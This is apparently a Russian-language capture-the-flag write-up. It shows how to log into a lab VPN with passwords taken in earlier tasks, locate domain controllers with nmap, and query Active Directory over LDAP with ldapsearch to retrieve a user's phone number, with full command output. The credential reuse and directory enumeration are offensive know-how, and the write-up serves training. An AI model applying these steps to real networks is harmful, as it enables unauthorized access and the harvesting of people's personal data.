# [infra-4] Внутренняя разведка (Active Directory)

## Description

Узнайте номер телефона пользователя Gerard Rodriquez.

# Solution

Из прошлых заданий у нас есть `config.ovpn` и данные от почты:

- `r_andrews@edu.stf` / `dancer` 
- `s_dotson@edu.stf` / `ricardo`

Но если мы попробуем в качестве логина почту, то ничего не выйдет.
Уберем часть, связанную с почтой и в итоге у нас получится подключится к 
впн:

- `r_andrews` / `dancer` 
- `s_dotson` / `ricardo`

После подключения перейдем к сканированию:

Чтобы найти контроллер домена (DC), тебе нужно просканировать эту сеть на наличие открытых портов:
- `88` (Kerberos)
- `389` (LDAP)
- `445` (SMB)

```bash
nmap -Pn -p 88,389,445 10.154.16.0/24 --open
```

Получили такое:

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-25 07:51 UTC
Nmap scan report for 10.154.16.100
Host is up (0.23s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.104
Host is up (0.22s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.105
Host is up (0.26s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.106
Host is up (0.26s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.107
Host is up (0.22s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.134
Host is up (0.29s latency).

PORT    STATE SERVICE
88/tcp  open  kerberos-sec
389/tcp open  ldap
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.135
Host is up (0.23s latency).

PORT    STATE SERVICE
88/tcp  open  kerberos-sec
389/tcp open  ldap
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.196
Host is up (0.24s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.197
Host is up (0.24s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.198
Host is up (0.20s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.201
Host is up (0.19s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.202
Host is up (0.20s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.203
Host is up (0.20s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.204
Host is up (0.20s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.205
Host is up (0.20s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap scan report for 10.154.16.208
Host is up (0.20s latency).
Not shown: 2 closed tcp ports (conn-refused)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 256 IP addresses (256 hosts up) scanned in 29.17 seconds
```

Данные ip подходят под DC: `10.154.16.134` и `10.154.16.135`

```bash
ldapsearch -x -H ldap://10.154.16.134 -D "CN=Ralf Andrews,CN=Users,DC=edu,DC=stf" -w 'dancer' -b "DC=edu,DC=stf" "(sAMAccountName=*rodriquez*)" telephoneNumber mobile pager
```
Что означает эта команда:

- `-H ldap://10.154.16.134` -- подключаемся к контроллеру домена по LDAP.
- `-D "CN=Ralf Andrews,CN=Users,DC=edu,DC=stf"` -- логинимся под учётной записью Ralf Andrews (это его DN, который был получен в infra-2).
- `-w 'dancer'` -- его пароль.
- `-b "DC=edu,DC=stf"` -- ищем по всему домену.
- `(sAMAccountName=*rodriquez*)` -- фильтр, который ищет пользователя с логином, содержащим rodriquez.
- `telephoneNumber mobile pager` -- атрибуты, которые мы хотим увидеть в ответе (номер телефона может храниться в любом из них).



```bash
# extended LDIF
#
# LDAPv3
# base <DC=edu,DC=stf> with scope subtree
# filter: (sAMAccountName=*rodriquez*)
# requesting: telephoneNumber mobile pager
#

# GRODRIQUEZ, Workstations, edu.stf
dn: CN=GRODRIQUEZ,OU=Workstations,DC=edu,DC=stf

# g_rodriquez, Operators department, Departments, edu.stf
dn: CN=g_rodriquez,OU=Operators department,OU=Departments,DC=edu,DC=stf
telephoneNumber: 8-777-112-99-25

# search reference
ref: ldap://ForestDnsZones.edu.stf/DC=ForestDnsZones,DC=edu,DC=stf

# search reference
ref: ldap://DomainDnsZones.edu.stf/DC=DomainDnsZones,DC=edu,DC=stf

# search reference
ref: ldap://edu.stf/CN=Configuration,DC=edu,DC=stf

# search result
search: 2
result: 0 Success

# numResponses: 6
# numEntries: 2
# numReferences: 3
```

Номер: `8-777-112-99-25`

## Quick explanation

> После получения доступа к учетным записям в `infra-2` 
> у нас появились валидные креды обычных пользователей домена.
> Так как по умолчанию любой аутентифицированный пользователь `AD`
> имеет право на чтение каталога, мы решили провести `AD Enumeration`
> через протокол `LDAP (порт 389)`.
> Предварительно мы обнаружили контроллеры домена 
> (`10.154.16.134`, `10.154.16.135`) с открытыми портами 
> `Kerberos`, `LDAP` и `SMB`.

> Для запроса мы использовали учетную запись `r_andrews (Ralf Andrews)`,
> так как это полноценный пользователь (в отличие от возможных сервисных учеток),
> и мы знали его `DN`. С помощью утилиты `ldapsearch` и фильтра 
> (`sAMAccountName=*rodriquez*`) мы извлекли скрытые атрибуты профиля
> `Gerard Rodriquez`.
> В ответе мы получили искомый номер телефона: `8-777-112-99-25`

